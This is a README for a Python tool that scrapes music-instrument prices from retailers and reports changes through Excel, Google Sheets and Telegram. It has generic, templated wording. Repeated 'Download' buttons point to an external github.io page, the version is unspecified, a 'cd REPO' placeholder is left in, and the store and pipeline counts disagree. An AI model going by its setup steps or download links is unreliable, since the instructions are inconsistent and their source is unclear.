# Acoustic Server - Music Pricing Comparison Automation 2026

> **Acoustic Server is a Python application for Linux servers that gathers music-instrument prices, evaluates comparable offers, and sends reports and price or availability alerts through Google Sheets and Telegram.**

[![Platform](https://img.shields.io/badge/Platform-Linux%20server-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hayeshenrywk290/acoustic-server-alerts?style=flat-square)](https://github.com/hayeshenrywk290/acoustic-server-alerts)

---

<p align="center">
  <a href="https://hayeshenrywk290.github.io/acoustic-server-alerts/">
    <img src="https://img.shields.io/badge/Download-Acoustic%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download Acoustic Server">
  </a>
</p>

> **[Download Acoustic Server](https://hayeshenrywk290.github.io/acoustic-server-alerts/)**

---

[Download Latest Build](https://hayeshenrywk290.github.io/acoustic-server-alerts/)

---

## Overview

Acoustic Server automates the collection and comparison of retail pricing for musical instruments. Playwright-based scrapers retrieve prices, availability details, and SKU values from seven stores, after which the gathered data is prepared for comparison and reporting.

The workflow is intended for teams and operators who need consistent e-commerce pricing data without visiting every retailer manually. It brings together product matching, Google Sheets updates, Excel report creation, and Telegram messaging in a scheduled process suitable for a Linux server.

---

## What It Does

- Retrieves prices, inventory status, and SKU data from seven music-instrument retailers
- Compares listings through product names, brands, categories, and SKU values
- Uses fuzzy comparison logic when store listing details vary
- Creates Excel files containing price comparisons
- Synchronizes processed records with Google Sheets
- Alerts Telegram recipients when price or stock values change
- Executes six separate scraper pipelines concurrently
- Starts a new scraping and reporting cycle every eight hours
- Performs freshness checks and staged validation as data moves through the pipeline

---

## Setup

Use a Linux server with Python installed to obtain the repository:

```bash
git clone https://github.com/hayeshenrywk290/acoustic-server-alerts.git
cd REPO
```

Install the dependencies specified by the project:

```bash
python3 -m pip install -r requirements.txt
```

Download the browser components needed by Playwright:

```bash
python3 -m playwright install
```

Before launching the service for the first time, set up the required external integrations and inspect the repository's designated entry point.

---

## Running the Service

The normal execution sequence is as follows:

1. Launch the scraper service on the Linux server.
2. Let all six scraper pipelines retrieve information from the supported stores.
3. Allow the matching process to connect equivalent listings using names, brands, categories, and SKUs.
4. Inspect the resulting Excel price-comparison report.
5. Review the synchronized data in Google Sheets.
6. Watch Telegram for notifications about price and stock changes.
7. Leave the scheduled process running so the next eight-hour cycle can start.

For an on-demand execution, run the Python entry point described in the repository documentation. Make sure the process can access all required service credentials before starting it.

---

## Settings and Integrations

The application needs configuration for the services involved in the pipeline, including Google Sheets synchronization and Telegram alerts. Use the configuration approach provided by the project for credentials and runtime options; do not place secrets directly in scraper source code.

The main settings to review include:

- Google Sheets destination and access credentials
- Telegram bot credentials and notification destination
- Scraper behavior for the supported stores
- The recurring execution interval
- Location for generated reports
- Freshness checks and validation rules

Protect all integration credentials and follow the secret-management practices used by the deployment environment.

---

## System Requirements

- Linux server
- Python runtime
- Playwright with its browser components
- Network connectivity to the supported e-commerce stores
- Google Sheets access for synchronizing results
- Telegram bot setup for notifications
- Disk space for Excel reports and pipeline data
- A scheduler or persistent service configuration for repeated runs

---

## Frequently Asked Questions

### Which products and data does Acoustic Server track?

The system gathers product prices, stock information, and SKUs from seven music-instrument stores and prepares those records for comparison.

### What determines whether two listings match?

Matching uses product names, brands, categories, and SKU values. Fuzzy matching helps account for differences in how individual retailers describe the same product.

### What is the collection interval?

Scraping and reporting are repeated every eight hours.

### How are the results shared?

The workflow creates Excel reports, syncs processed results to Google Sheets, and sends Telegram notifications when prices or stock conditions change.

### What can cause an incomplete run?

Start by checking pipeline logs, connectivity to the store websites, and the Playwright browser installation. Also review the freshness checks and staged-validation results.

### How are Google Sheets and Telegram set up?

Supply the required credentials and destination values through the configuration mechanism supported by the repository. Secrets should not be committed to tracked source files.

### Does the project specify a release version?

The current project metadata does not specify a release version. Check the repository for the latest build and its deployment guidance.

### Where can I get assistance?

Visit the project's GitHub repository for documentation, issue reporting, and discussions about setup or runtime problems.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
